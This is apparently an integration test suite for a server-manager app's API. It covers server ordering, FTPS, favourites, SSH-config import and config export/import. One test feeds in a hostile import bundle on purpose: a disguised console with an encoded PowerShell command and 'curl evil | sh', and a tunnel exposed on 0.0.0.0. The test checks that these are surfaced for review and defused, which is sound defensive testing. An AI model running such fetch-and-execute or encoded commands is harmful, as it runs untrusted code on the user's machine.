import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import type { ConfigImportPreview, ConfigImportResult, ExportBundle, SshConfigApplyResult, SshConfigPreview } from '../../shared/organization';
import type { ServerSummary } from '../../shared/types';
import { bootTestServer, type TestServer } from '../helpers/testServer';

// Server organization through the HTTP API: manual order, the FTPS flag,
// importing ~/.ssh/config and exporting / importing the configuration.

let server: TestServer;
const home = fs.mkdtempSync(path.join(os.tmpdir(), 'shellmind-home-'));

async function api<T = unknown>(method: string, urlPath: string, body?: unknown): Promise<{ status: number; body: T }> {
    const res = await server.fetch(urlPath, {
        method,
        headers: body === undefined ? {} : { 'content-type': 'application/json' },
        body: body === undefined ? undefined : JSON.stringify(body),
    });
    const text = await res.text();
    return { status: res.status, body: (text ? JSON.parse(text) : null) as T };
}

function sql<T = unknown>(query: string, params: unknown[] = []): Promise<T[]> {
    return new Promise((resolve, reject) => server.db.all(query, params, (err, rows) => (err ? reject(err) : resolve(rows as T[]))));
}

async function create(body: Record<string, unknown>): Promise<ServerSummary> {
    const res = await api<{ data: ServerSummary }>('POST', '/api/servers', body);
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    return res.body.data;
}

async function list(): Promise<ServerSummary[]> {
    return (await api<{ data: ServerSummary[] }>('GET', '/api/servers')).body.data;
}

async function removeAll(): Promise<void> {
    // Dependents first (a jump host in use cannot be deleted).
    for (const row of (await list()).sort((a, b) => Number(Boolean(b.jump_server_id)) - Number(Boolean(a.jump_server_id)))) {
        expect((await api('DELETE', `/api/servers/${row.id}`)).status).toBe(200);
    }
}

beforeAll(async () => {
    vi.spyOn(console, 'log').mockImplementation(() => {});
    server = await bootTestServer();
});

afterAll(async () => {
    await server?.close();
    fs.rmSync(home, { recursive: true, force: true });
    vi.restoreAllMocks();
});

describe('manual order', () => {
    it('stores the order of the given servers and validates the list', async () => {
        const a = await create({ name: 'order-a', ip: '10.1.0.1', type: 'linux' });
        const b = await create({ name: 'order-b', ip: '10.1.0.2', type: 'linux' });
        const c = await create({ name: 'order-c', ip: '10.1.0.3', type: 'linux' });

        const res = await api<{ changes: number }>('POST', '/api/servers/reorder', { ids: [c.id, a.id, b.id, 999999] });
        expect(res).toMatchObject({ status: 200, body: { changes: 3 } });
        expect((await list()).filter((row) => row.name.startsWith('order-')).map((row) => row.name)).toEqual(['order-c', 'order-a', 'order-b']);

        for (const ids of [undefined, 'x', [a.id, a.id], [0], [1.5]]) {
            const refused = await api<{ code: string }>('POST', '/api/servers/reorder', { ids });
            expect(refused.status, JSON.stringify(ids)).toBe(400);
            expect(refused.body.code).toBe('INVALID_ORDER');
        }
        await removeAll();
    });

    it('puts new servers after the saved ones, also after a reorder and from imports', async () => {
        const a = await create({ name: 'last-a', ip: '10.1.1.1', type: 'linux' });
        const b = await create({ name: 'last-b', ip: '10.1.1.2', type: 'linux' });
        expect((await api('POST', '/api/servers/reorder', { ids: [b.id, a.id] })).status).toBe(200);

        const c = await create({ name: 'last-c', ip: '10.1.1.3', type: 'linux' });
        expect(c.sort_order).toBe(2);
        // An explicit place is kept; an edit without one keeps the current place.
        await create({ name: 'first', ip: '10.1.1.4', type: 'linux', sort_order: -1 });
        expect((await api('PUT', `/api/servers/${c.id}`, { name: 'last-c', ip: '10.1.1.3', type: 'linux', notes: 'edited' })).status).toBe(200);

        await api('POST', '/api/import/ssh-config/apply', { entries: [{ alias: 'from-ssh', host: '10.1.1.5', user: 'u' }] });
        // A file from another install keeps its own relative order, after everything here.
        await api('POST', '/api/import', {
            format: 'shellmind-config',
            version: 1,
            servers: [
                { ref: 1, name: 'file-second', ip: '10.1.1.7', type: 'linux', sort_order: 1 },
                { ref: 2, name: 'file-first', ip: '10.1.1.6', type: 'linux', sort_order: 0 },
            ],
        });

        expect((await list()).map((row) => row.name)).toEqual(['first', 'last-b', 'last-a', 'last-c', 'from-ssh', 'file-first', 'file-second']);
        await removeAll();
    });
});

describe('FTPS flag', () => {
    it('is saved with the server and turning it off needs the password again or a confirmation', async () => {
        const ftp = { name: 'ftps', ip: '10.2.0.1', type: 'ftp', username: 'up' };
        const saved = await create({ ...ftp, password: 'pw-ftps', ftp_secure: true });
        expect(saved.ftp_secure).toBe(1);

        // Older clients do not send the flag: it is kept.
        expect((await api('PUT', `/api/servers/${saved.id}`, { ...ftp })).status).toBe(200);
        expect((await list()).find((row) => row.id === saved.id)?.ftp_secure).toBe(1);

        const downgrade = await api<{ code: string; details: { kept: string[] } }>('PUT', `/api/servers/${saved.id}`, { ...ftp, ftp_secure: false });
        expect(downgrade.status).toBe(409);
        expect(downgrade.body).toMatchObject({ code: 'SECRETS_RETARGET', details: { kept: ['password'] } });

        expect((await api('PUT', `/api/servers/${saved.id}`, { ...ftp, ftp_secure: false, keep_secrets: true })).status).toBe(200);
        expect((await list()).find((row) => row.id === saved.id)?.ftp_secure).toBe(0);
        // Turning it on is never a downgrade.
        expect((await api('PUT', `/api/servers/${saved.id}`, { ...ftp, ftp_secure: true })).status).toBe(200);

        expect((await api('POST', '/api/servers', { ...ftp, ftp_secure: 'yes' })).status).toBe(400);
        await removeAll();
    });
});

describe('favourites', () => {
    it('pins and unpins a server without counting as an edit', async () => {
        const saved = await create({ name: 'fav', ip: '10.3.0.1', type: 'linux', username: 'ops', password: 'pw-fav' });
        expect(saved.favorite).toBe(0);
        const editedAt = saved.updated_at;

        const pinned = await api<{ data: ServerSummary }>('PATCH', `/api/servers/${saved.id}/favorite`, { favorite: true });
        expect(pinned.status).toBe(200);
        expect(pinned.body.data).toMatchObject({ id: saved.id, favorite: 1, updated_at: editedAt, has_password: 1 });
        expect((await list()).find((row) => row.id === saved.id)?.favorite).toBe(1);

        // An edit from a client that does not know the flag keeps it.
        expect((await api('PUT', `/api/servers/${saved.id}`, { name: 'fav', ip: '10.3.0.1', type: 'linux', username: 'ops' })).status).toBe(200);
        expect((await list()).find((row) => row.id === saved.id)?.favorite).toBe(1);

        expect((await api('PATCH', `/api/servers/${saved.id}/favorite`, { favorite: false })).status).toBe(200);
        expect((await list()).find((row) => row.id === saved.id)?.favorite).toBe(0);
        await removeAll();
    });

    it('can be set on create and travels with an export', async () => {
        const saved = await create({ name: 'fav-new', ip: '10.3.0.2', type: 'linux', favorite: true });
        expect(saved.favorite).toBe(1);
        const bundle = await (await server.fetch('/api/export')).json() as ExportBundle;
        expect(bundle.servers.find((row) => row.name === 'fav-new')?.favorite).toBe(true);
        await removeAll();

        await api('POST', '/api/import', {
            format: 'shellmind-config',
            version: 1,
            servers: [
                { ref: 1, name: 'imported-fav', ip: '10.3.0.3', type: 'linux', favorite: true },
                // Files from before favourites have no flag.
                { ref: 2, name: 'imported-plain', ip: '10.3.0.4', type: 'linux' },
            ],
        });
        const rows = await list();
        expect(rows.find((row) => row.name === 'imported-fav')?.favorite).toBe(1);
        expect(rows.find((row) => row.name === 'imported-plain')?.favorite).toBe(0);
        await removeAll();
    });

    it('refuses anything but a boolean and unknown servers', async () => {
        const saved = await create({ name: 'fav-bad', ip: '10.3.0.5', type: 'linux' });
        for (const favorite of [undefined, 1, 'true', null]) {
            expect((await api('PATCH', `/api/servers/${saved.id}/favorite`, { favorite })).status, JSON.stringify(favorite)).toBe(400);
        }
        expect((await api('PATCH', '/api/servers/999999/favorite', { favorite: true })).status).toBe(404);
        expect((await api('PATCH', '/api/servers/abc/favorite', { favorite: true })).status).toBe(404);
        expect((await api('POST', '/api/servers', { name: 'x', ip: '10.3.0.6', type: 'linux', favorite: 'yes' })).status).toBe(400);
        await removeAll();
    });
});

describe('importing ~/.ssh/config', () => {
    const CONFIG = [
        'Host bastion',
        '  HostName 203.0.113.5',
        '  User jump',
        'Host app',
        '  HostName 10.3.0.10',
        '  User deploy',
        '  Port 2222',
        '  IdentityFile ~/.ssh/app_ed25519',
        '  ProxyJump bastion',
        'Host known',
        '  HostName 10.3.0.99',
        '  User root',
        'Host *',
        '  ServerAliveInterval 30',
    ].join('\n');

    it('previews the backend user\'s config file without saving anything', async () => {
        fs.mkdirSync(path.join(home, '.ssh'), { recursive: true });
        fs.writeFileSync(path.join(home, '.ssh', 'config'), CONFIG);
        const known = await create({ name: 'already-here', ip: '10.3.0.99', type: 'linux', username: 'root' });

        const previous = { HOME: process.env.HOME, USERPROFILE: process.env.USERPROFILE };
        process.env.HOME = home;
        process.env.USERPROFILE = home;
        try {
            const res = await api<SshConfigPreview>('POST', '/api/import/ssh-config/preview', {});
            expect(res.status).toBe(200);
            expect(res.body.source).toBe(path.join(home, '.ssh', 'config'));
            expect(res.body.entries.map((entry) => [entry.alias, entry.host, entry.port, entry.user, entry.proxyJump])).toEqual([
                ['bastion', '203.0.113.5', null, 'jump', null],
                ['app', '10.3.0.10', 2222, 'deploy', 'bastion'],
                ['known', '10.3.0.99', null, 'root', null],
            ]);
            expect(res.body.entries[2].duplicateOf).toEqual({ id: known.id, name: 'already-here' });

            fs.rmSync(path.join(home, '.ssh', 'config'));
            const missing = await api<{ code: string }>('POST', '/api/import/ssh-config/preview', {});
            expect(missing).toMatchObject({ status: 404, body: { code: 'SSH_CONFIG_NOT_FOUND' } });
        } finally {
            Object.assign(process.env, previous);
        }
        expect(await list()).toHaveLength(1);
    });

    it('previews pasted text and refuses a non-string body', async () => {
        const res = await api<SshConfigPreview>('POST', '/api/import/ssh-config/preview', { text: 'Host x\n  User u\n  HostName 10.9.9.9\n' });
        expect(res.status).toBe(200);
        expect(res.body).toMatchObject({ source: null, entries: [{ alias: 'x', host: '10.9.9.9', user: 'u' }] });
        expect((await api('POST', '/api/import/ssh-config/preview', { text: 42 })).status).toBe(400);
    });

    it('creates jump hosts first, links them and skips duplicates', async () => {
        const preview = await api<SshConfigPreview>('POST', '/api/import/ssh-config/preview', { text: CONFIG });
        // The app entry is listed before its jump host on purpose.
        const entries = [...preview.body.entries].reverse().map(({ alias, host, port, user, identityFile, proxyJump }) =>
            ({ alias, host, port, user, identityFile, proxyJump, name: alias === 'app' ? 'App server' : undefined }));

        const res = await api<SshConfigApplyResult>('POST', '/api/import/ssh-config/apply', { entries, group_name: 'From SSH config' });
        expect(res.status).toBe(200);
        expect(res.body.created.map((outcome) => outcome.name)).toEqual(['bastion', 'App server']);
        expect(res.body.skipped).toEqual([{ name: 'known', id: expect.any(Number), reason: 'duplicate', detail: 'already-here' }]);

        // W7-S2: the IdentityFile becomes the key file of an identity.
        expect(res.body.identities).toEqual({ created: [{ name: 'app_ed25519', id: expect.any(Number) }], skipped: [] });
        const rows = await list();
        const bastion = rows.find((row) => row.name === 'bastion')!;
        expect(rows.find((row) => row.name === 'App server')).toMatchObject({
            ip: '10.3.0.10', port: 2222, username: 'deploy', private_key_path: null, identity_id: res.body.identities?.created[0].id,
            jump_server_id: bastion.id, group_name: 'From SSH config', type: 'linux',
        });

        // Importing again changes nothing.
        const again = await api<SshConfigApplyResult>('POST', '/api/import/ssh-config/apply', { entries });
        expect(again.body.created).toEqual([]);
        expect(again.body.skipped.map((outcome) => outcome.reason)).toEqual(['duplicate', 'duplicate', 'duplicate']);
    });

    it('links hosts to the saved copy of a jump alias when only the new entries are sent, as the wizard does', async () => {
        await removeAll();
        // A saved server that shares the alias as its name but is another machine…
        const namesake = await create({ name: 'bastion', ip: '198.51.100.10', type: 'linux', username: 'admin' });
        // …and the jump host of the file, saved by an earlier import under another name.
        const edge = await create({ name: 'edge', ip: '203.0.113.5', type: 'linux', username: 'jump' });
        const text = [
            'Host bastion', '  HostName 203.0.113.5', '  User jump',
            'Host newinner', '  HostName 10.7.0.1', '  User u', '  ProxyJump bastion',
            'Host gw-alias', '  HostName 198.51.100.10', '  User admin',
            'Host behind-gw', '  HostName 10.7.0.2', '  User u', '  ProxyJump gw-alias',
        ].join('\n');

        const preview = await api<SshConfigPreview>('POST', '/api/import/ssh-config/preview', { text });
        const byAlias = Object.fromEntries(preview.body.entries.map((entry) => [entry.alias, entry]));
        expect(byAlias.bastion.duplicateOf).toEqual({ id: edge.id, name: 'edge' });
        expect(byAlias['gw-alias'].duplicateOf).toEqual({ id: namesake.id, name: 'bastion' });
        expect(byAlias.newinner.proxyJumpSavedId).toBe(edge.id);
        expect(byAlias['behind-gw'].proxyJumpSavedId).toBe(namesake.id);

        const entries = preview.body.entries
            .filter((entry) => !entry.duplicateOf)
            .map(({ alias, host, port, user, identityFile, proxyJump, proxyJumpSavedId }) => ({ alias, host, port, user, identityFile, proxyJump, proxyJumpSavedId }));
        const res = await api<SshConfigApplyResult>('POST', '/api/import/ssh-config/apply', { entries });
        expect(res.body).toEqual({ created: [{ name: 'newinner', id: expect.any(Number) }, { name: 'behind-gw', id: expect.any(Number) }], skipped: [] });

        const rows = await list();
        expect(rows.find((row) => row.name === 'newinner')?.jump_server_id).toBe(edge.id);
        expect(rows.find((row) => row.name === 'behind-gw')?.jump_server_id).toBe(namesake.id);

        // A previewed jump host that is gone (or not SSH) is not replaced by a guess.
        const ftp = await create({ name: 'files', ip: '10.7.0.9', type: 'ftp' });
        const stale = await api<SshConfigApplyResult>('POST', '/api/import/ssh-config/apply', {
            entries: [
                { alias: 'gone', host: '10.7.0.3', user: 'u', proxyJump: 'bastion', proxyJumpSavedId: 999999 },
                { alias: 'via-ftp', host: '10.7.0.4', user: 'u', proxyJump: 'files', proxyJumpSavedId: ftp.id },
                { alias: 'unresolved', host: '10.7.0.5', user: 'u', proxyJump: 'bastion', proxyJumpSavedId: null },
            ],
        });
        expect(stale.body.skipped.map((outcome) => [outcome.name, outcome.reason])).toEqual([
            ['gone', 'jump-missing'], ['via-ftp', 'jump-missing'], ['unresolved', 'jump-missing'],
        ]);
        expect((await api('POST', '/api/import/ssh-config/apply', { entries: [{ alias: 'x', host: 'h', proxyJumpSavedId: 'one' }] })).status).toBe(400);
        await removeAll();
    });

    it('skips entries whose jump host is missing and validates the body', async () => {
        const res = await api<SshConfigApplyResult>('POST', '/api/import/ssh-config/apply', {
            entries: [
                { alias: 'orphan', host: '10.4.0.1', user: 'u', proxyJump: 'nowhere' },
                { alias: 'loop-a', host: '10.4.0.2', user: 'u', proxyJump: 'loop-b' },
                { alias: 'loop-b', host: '10.4.0.3', user: 'u', proxyJump: 'loop-a' },
                { alias: 'bad-port', host: '10.4.0.4', user: 'u', port: 70000 },
            ],
        });
        expect(res.body.created).toEqual([]);
        expect(res.body.skipped.map((outcome) => [outcome.name, outcome.reason])).toEqual([
            ['loop-b', 'jump-missing'],
            ['loop-a', 'jump-missing'],
            ['orphan', 'jump-missing'],
            ['bad-port', 'invalid'],
        ]);

        for (const body of [{}, { entries: [] }, { entries: [{ alias: 'x' }] }, { entries: ['x'] }]) {
            const refused = await api<{ code: string }>('POST', '/api/import/ssh-config/apply', body);
            expect(refused.status, JSON.stringify(body)).toBe(400);
            expect(refused.body.code).toBe('INVALID_IMPORT');
        }
        await removeAll();
    });
});

describe('exporting and importing the configuration', () => {
    it('exports servers without secrets, with snippets and tunnels', async () => {
        const bastion = await create({ name: 'exp-bastion', ip: '10.5.0.1', type: 'linux', username: 'jump', password: 'pw-bastion-secret' });
        const app = await create({
            name: 'exp-app', ip: '10.5.0.2', type: 'linux', username: 'deploy', privateKey: 'KEY-app-secret', passphrase: 'pp-app-secret',
            jump_server_id: bastion.id, group_name: 'prod', tags: ['web'], color: 'violet', notes: 'main app', sort_order: 4,
        });
        await create({ name: 'exp-bucket', ip: '', type: 's3', s3_bucket: 'logs', s3_access_key: 'AKIAEXAMPLE', s3_secret_key: 's3-secret-value' });
        await create({ name: 'exp-ftp', ip: '10.5.0.3', type: 'ftp', password: 'pw-ftp-secret', ftp_secure: true });
        const now = Date.now();
        await sql('INSERT INTO snippets (name, command, description, tags, server_id, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?)',
            ['restart', 'systemctl restart app', 'Restarts the app', '["ops"]', app.id, now, now]);
        await sql('INSERT INTO snippets (name, command, server_id, created_at, updated_at) VALUES (?, ?, NULL, ?, ?)', ['uptime', 'uptime', now, now]);
        await sql('INSERT INTO tunnels (server_id, name, local_port, remote_host, remote_port, auto_start, created_at) VALUES (?, ?, ?, ?, ?, 1, ?)',
            [app.id, 'db', 15432, '127.0.0.1', 5432, now]);

        const res = await server.fetch('/api/export');
        expect(res.status).toBe(200);
        const text = await res.text();
        for (const secret of ['pw-bastion-secret', 'KEY-app-secret', 'pp-app-secret', 's3-secret-value', 'pw-ftp-secret', 'enc:v1']) {
            expect(text).not.toContain(secret);
        }
        const bundle = JSON.parse(text) as ExportBundle;
        expect(bundle).toMatchObject({ format: 'shellmind-config', version: 1 });
        expect(bundle.servers.find((row) => row.name === 'exp-app')).toMatchObject({
            ref: app.id, jump_ref: bastion.id, group_name: 'prod', tags: ['web'], color: 'violet', notes: 'main app', sort_order: 4,
        });
        expect(bundle.servers.find((row) => row.name === 'exp-ftp')?.ftp_secure).toBe(true);
        expect(bundle.servers.find((row) => row.name === 'exp-bucket')?.s3_access_key).toBe('AKIAEXAMPLE');
        expect(bundle.snippets).toEqual([
            { name: 'restart', command: 'systemctl restart app', description: 'Restarts the app', tags: ['ops'], server_ref: app.id },
            { name: 'uptime', command: 'uptime', description: null, tags: [], server_ref: null },
        ]);
        expect(bundle.tunnels).toEqual([
            { server_ref: app.id, name: 'db', local_host: '127.0.0.1', local_port: 15432, remote_host: '127.0.0.1', remote_port: 5432, auto_start: true },
        ]);

        // Importing into the same install: everything is already there.
        const same = await api<ConfigImportResult>('POST', '/api/import', bundle);
        expect(same.status).toBe(200);
        expect(same.body.servers.created).toEqual([]);
        expect(same.body.servers.skipped.every((outcome) => outcome.reason === 'duplicate')).toBe(true);
        expect(same.body.snippets.skipped.map((outcome) => outcome.reason)).toEqual(['duplicate', 'duplicate']);
        expect(same.body.tunnels.skipped.map((outcome) => outcome.reason)).toEqual(['duplicate']);

        // Into an empty install: servers are recreated without secrets and relinked.
        await sql('DELETE FROM snippets');
        await removeAll();
        // The file lists the dependent server before its jump host.
        const reordered = { ...bundle, servers: [...bundle.servers].sort((a, b) => Number(Boolean(b.jump_ref)) - Number(Boolean(a.jump_ref))) };
        const fresh = await api<ConfigImportResult>('POST', '/api/import', reordered);
        expect(fresh.status).toBe(200);
        expect(fresh.body.servers.created.map((outcome) => outcome.name).sort()).toEqual(['exp-app', 'exp-bastion', 'exp-bucket', 'exp-ftp']);
        expect(fresh.body.snippets.created.map((outcome) => outcome.name)).toEqual(['restart', 'uptime']);
        expect(fresh.body.tunnels.created.map((outcome) => outcome.name)).toEqual(['db']);

        const rows = await list();
        const newApp = rows.find((row) => row.name === 'exp-app')!;
        const newBastion = rows.find((row) => row.name === 'exp-bastion')!;
        expect(newApp).toMatchObject({ jump_server_id: newBastion.id, has_private_key: 0, has_passphrase: 0, tags: ['web'] });
        expect(rows.find((row) => row.name === 'exp-ftp')).toMatchObject({ ftp_secure: 1, has_password: 0 });
        expect(await sql('SELECT server_id FROM snippets WHERE name = ?', ['restart'])).toEqual([{ server_id: newApp.id }]);
        // Imported tunnels never start on their own.
        expect(await sql('SELECT server_id, auto_start FROM tunnels')).toEqual([{ server_id: newApp.id, auto_start: 0 }]);
    });

    it('previews an import without saving anything and lists the local commands and tunnels it would add', async () => {
        await sql('DELETE FROM tunnels');
        await sql('DELETE FROM snippets');
        await removeAll();
        const bundle = {
            format: 'shellmind-config',
            version: 1,
            servers: [
                { ref: 1, name: 'innocent-name', ip: 'local', type: 'local', cli_preset: 'custom', command: 'powershell.exe -enc AAAA', initial_command: 'curl evil | sh', cwd: 'C:\\' },
                { ref: 2, name: 'plain-shell', ip: 'local', type: 'local', cli_preset: 'shell' },
                { ref: 3, name: 'db-host', ip: '10.8.0.1', type: 'linux', username: 'u' },
            ],
            snippets: [{ name: 'uptime', command: 'uptime' }],
            tunnels: [
                { server_ref: 3, name: 'exposed', local_host: '0.0.0.0', local_port: 15432, remote_host: '127.0.0.1', remote_port: 5432, auto_start: true },
                { server_ref: 3, name: 'v6', local_host: '[::1]', local_port: 16379, remote_host: '127.0.0.1', remote_port: 6379 },
            ],
        };

        const preview = await api<ConfigImportPreview>('POST', '/api/import/preview', bundle);
        expect(preview.status).toBe(200);
        expect(preview.body.servers.created).toEqual([{ name: 'innocent-name' }, { name: 'plain-shell' }, { name: 'db-host' }]);
        expect(preview.body.snippets.created).toEqual([{ name: 'uptime' }]);
        expect(preview.body.review.consoles).toEqual([
            { name: 'innocent-name', cli_preset: 'custom', command: 'powershell.exe -enc AAAA', initial_command: 'curl evil | sh', cwd: 'C:\\' },
        ]);
        expect(preview.body.review.tunnels).toEqual([
            { name: 'exposed', server: 'db-host', local_host: '127.0.0.1', local_port: 15432, remote_host: '127.0.0.1', remote_port: 5432 },
            { name: 'v6', server: 'db-host', local_host: '::1', local_port: 16379, remote_host: '127.0.0.1', remote_port: 6379 },
        ]);
        // Nothing was written.
        expect(await list()).toEqual([]);
        expect(await sql('SELECT id FROM snippets')).toEqual([]);
        expect(await sql('SELECT id FROM tunnels')).toEqual([]);
        expect((await api('POST', '/api/import/preview', { format: 'other' })).status).toBe(400);

        const applied = await api<ConfigImportResult>('POST', '/api/import', bundle);
        expect(applied.body.tunnels.created.map((outcome) => outcome.name)).toEqual(['exposed', 'v6']);
        expect(await sql('SELECT name, local_host, auto_start FROM tunnels ORDER BY id')).toEqual([
            { name: 'exposed', local_host: '127.0.0.1', auto_start: 0 },
            { name: 'v6', local_host: '::1', auto_start: 0 },
        ]);
        await sql('DELETE FROM tunnels');
        await sql('DELETE FROM snippets');
        await removeAll();
    });

    it('accepts an export larger than the default 1 MB body limit', async () => {
        const notes = 'n'.repeat(16000);
        const servers = Array.from({ length: 80 }, (_, index) => ({ ref: index + 1, name: `big-${index}`, ip: `10.9.${index}.1`, type: 'linux', notes }));
        const body = { format: 'shellmind-config', version: 1, servers };
        expect(JSON.stringify(body).length).toBeGreaterThan(1024 * 1024);

        const preview = await api<ConfigImportPreview>('POST', '/api/import/preview', body);
        expect(preview.status).toBe(200);
        expect(preview.body.servers.created).toHaveLength(80);
        expect((await api('POST', '/api/import', body)).status).toBe(200);
        expect(await list()).toHaveLength(80);
        await removeAll();
    });

    it('reports what it could not import and refuses foreign files', async () => {
        await create({ name: 'saved-ftp', ip: '10.6.0.9', type: 'ftp' });
        const res = await api<ConfigImportResult>('POST', '/api/import', {
            format: 'shellmind-config',
            version: 1,
            servers: [
                { ref: 1, name: 'needs-jump', ip: '10.6.0.1', type: 'linux', jump_ref: 99 },
                { ref: 2, name: 'bad-type', ip: '10.6.0.2', type: 'telnet' },
                { ref: 3, name: 'console', ip: 'local', type: 'local', cli_preset: 'shell' },
                // Already saved: the file's tunnels go to the saved server.
                { ref: 4, name: 'saved-ftp', ip: '10.6.0.9', type: 'ftp' },
            ],
            snippets: [
                { name: 'orphan', command: 'ls', server_ref: 1 },
                { name: '', command: 'ls' },
                // Longer than the snippet editor allows.
                { name: 'n'.repeat(121), command: 'ls' },
            ],
            tunnels: [
                { server_ref: 2, local_port: 1, remote_host: 'x', remote_port: 2 },
                { server_ref: 1, local_port: 0, remote_host: 'x', remote_port: 2 },
                // Not a host name the tunnel editor accepts.
                { server_ref: 1, local_port: 5000, remote_host: 'db/primary', remote_port: 2 },
                // Only SSH servers have tunnels (the Tunnels tab could not show these).
                { server_ref: 3, name: 'on-console', local_port: 15000, remote_host: '127.0.0.1', remote_port: 5432 },
                { server_ref: 4, name: 'on-ftp', local_port: 15001, remote_host: '127.0.0.1', remote_port: 5432 },
            ],
        });
        expect(res.status).toBe(200);
        expect(res.body.servers.skipped.map((outcome) => [outcome.name, outcome.reason])).toEqual([
            ['needs-jump', 'jump-missing'], ['bad-type', 'invalid'], ['saved-ftp', 'duplicate'],
        ]);
        expect(res.body.servers.created.map((outcome) => outcome.name)).toEqual(['console']);
        expect(res.body.snippets.skipped.map((outcome) => outcome.reason)).toEqual(['server-missing', 'invalid', 'invalid']);
        expect(res.body.tunnels.skipped.map((outcome) => outcome.reason)).toEqual(['server-missing', 'invalid', 'invalid', 'unsupported-server', 'unsupported-server']);
        expect(res.body.tunnels.skipped.slice(3)).toEqual([
            { name: 'on-console', reason: 'unsupported-server', detail: 'console' },
            { name: 'on-ftp', reason: 'unsupported-server', detail: 'saved-ftp' },
        ]);
        expect(res.body.tunnels.created).toEqual([]);
        expect(await sql('SELECT id FROM tunnels')).toEqual([]);
        await removeAll();

        for (const body of [{}, { format: 'other', version: 1 }, { format: 'shellmind-config', version: 2 }, { format: 'shellmind-config', version: 1, servers: 'x' }]) {
            const refused = await api<{ code: string }>('POST', '/api/import', body);
            expect(refused.status, JSON.stringify(body)).toBe(400);
            expect(refused.body.code).toBe('INVALID_IMPORT');
        }
    });

    it('requires the session token', async () => {
        for (const [method, url] of [['GET', '/api/export'], ['POST', '/api/import'], ['POST', '/api/import/ssh-config/preview'], ['POST', '/api/servers/reorder']]) {
            const res = await fetch(`${server.baseUrl}${url}`, { method });
            expect(res.status, url).toBe(401);
        }
    });
});
